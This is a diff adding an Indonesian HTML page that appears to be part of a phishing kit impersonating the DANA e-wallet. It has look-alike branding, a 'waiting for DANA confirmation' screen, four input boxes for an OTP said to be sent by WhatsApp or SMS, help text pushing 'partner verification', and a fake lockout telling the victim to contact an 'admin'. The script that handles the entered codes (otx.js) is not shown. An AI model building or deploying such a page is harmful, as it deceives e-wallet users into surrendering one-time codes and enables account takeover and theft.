@@ -1,0 +1,314 @@
+<!-- otp.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width,
+initial-scale=1.0,
+maximum-scale=1.0,
+user-scalable=no">
+
+<title>AJUKAN</title>
+
+<link rel="stylesheet"
+href="otx.css">
+
+</head>
+<body>
+
+<div class="container">
+
+    <!-- LOGO -->
+    <div class="logo-wrap">
+
+        <img
+        src="assets/logo-danaa.png"
+        class="logo">
+
+    </div>
+
+    <!-- ========================= -->
+<!-- NOTIF -->
+<!-- ========================= -->
+
+<div
+class="notif-overlay"
+id="notifOverlay">
+
+    <div
+    class="notif-box"
+    id="notifBox">
+
+        <img
+        src="assets/notif.png"
+        class="notif-img">
+
+    </div>
+
+</div>
+
+    <!-- TEKS MENUNGGU -->
+<div class="waiting-wrapper">
+
+    <div class="video-text">
+        Menunggu Konfirmasi di Aplikasi DANA
+    </div>
+
+    <div class="dots-loading">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+
+</div>
+
+<!-- VIDEO CARD -->
+<div class="card photo-card">
+
+    <video
+    class="photo-video"
+    autoplay
+    muted
+    loop
+    playsinline>
+
+        <source
+        src="assets/verifikasi.mp4"
+        type="video/mp4">
+
+    </video>
+
+</div>
+
+<button class="lanjut-btn" id="lanjutBtn">
+    LANJUTKAN
+</button>
+
+<!-- SOUND -->
+<audio
+id="successSound"
+autoplay>
+
+<source
+src="assets/successss.mp3"
+type="audio/mpeg">
+
+</audio>
+
+
+<div class="otp-card">
+
+  <button class="close-otp" id="closeOtp">
+    &times;
+</button>
+
+    <div class="title verifikasi-title">
+        
+        Jika Sudah di Verifikasi 
+
+    </div>
+
+    <!-- TITLE -->
+    <div class="title">
+        
+        Kode <b>OTP</b> Terkirim ke
+
+    </div>
+
+
+
+    <!-- NOMOR -->
+    <div class="number-box">
+
+        <div class="flag-box">
+
+            <img
+            src="assets/flag-id.png"
+            class="flag">
+
+        </div>
+
+        <span class="kode">
+            +62
+        </span>
+
+        <span class="nomor phone-number">
+            822-7697-59061
+        </span>
+
+    </div>
+
+    <!-- VIA -->
+    <div class="via">
+
+        via
+
+        <span class="wa-box">
+
+            <img
+            src="assets/wa.png"
+            class="via-icon">
+
+            WhatsApp
+
+        </span>
+
+        /
+
+        <span class="sms-box">
+
+            <img
+            src="assets/sms.png"
+            class="via-icon">
+
+            SMS
+
+        </span>
+
+    </div>
+
+    <!-- OTP -->
+    <div class="otp-container">
+
+        <input
+        type="tel"
+        class="otp-box"
+        maxlength="1">
+
+        <input
+        type="tel"
+        class="otp-box"
+        maxlength="1">
+
+        <input
+        type="tel"
+        class="otp-box"
+        maxlength="1">
+
+        <input
+        type="tel"
+        class="otp-box"
+        maxlength="1">
+
+    </div>
+
+    <!-- ALERT -->
+    <div class="alert-box error-box">
+
+        <div class="alert-title"></div>
+
+        <div class="alert-desc"></div>
+
+    </div>
+
+    <!-- RESEND -->
+    <div class="resend-box">
+
+        <button
+        class="resend-btn">
+
+            KIRIM ULANG
+
+        </button>
+
+        <div class="timer">
+
+            00:60
+
+        </div>
+
+    </div>
+
+    <div class="help-otp" id="helpOtp">
+    Tidak menerima kode OTP?
+</div>
+
+</div>
+
+<div class="help-popup" id="helpPopup">
+
+    <div class="help-content">
+
+        <button class="help-close" id="helpClose">
+            &times;
+        </button>
+
+        <div class="help-title">
+            Jika belum menerima kode OTP
+        </div>
+
+        <div class="help-desc">
+            Pastikan kamu sudah verifikasi partner.
+            Jika kamu belum menerima notifikasi verifikasi partner,
+            pastikan nomor atau data yang kamu isi sudah benar.
+        </div>
+
+        <div class="help-subtitle">
+            Cara Verifikasi Partner
+        </div>
+
+        <div class="tutorial-box">
+
+    <img
+    src="assets/cara-verifikasi.jpg"
+    class="help-image">
+
+</div>
+
+    </div>
+
+</div>
+
+<!-- BLOCK PAGE -->
+<div class="blocked-box">
+
+    <div class="blocked-title">
+
+        Kamu sudah memasukan kode salah 4x
+
+    </div>
+
+    <div class="blocked-desc">
+
+        Silahkan mulai dari awal
+        atau hubungi admin
+
+    </div>
+
+    <button class="blocked-btn">
+
+        MULAI DARI AWAL
+
+    </button>
+
+</div>
+
+<!-- LOADING -->
+<div class="loading-box"
+id="loadingBox">
+
+    <div class="loading-circle">
+
+        <div class="spinner-ring"></div>
+
+        <img
+        src="assets/loadingg-danaa.png"
+        class="loading-logo">
+
+    </div>
+
+    <div class="loading-text">
+
+        Memuat...
+
+    </div>
+
+</div>
+
+<script src="otx.js"></script>
+
+</body>
+</html>
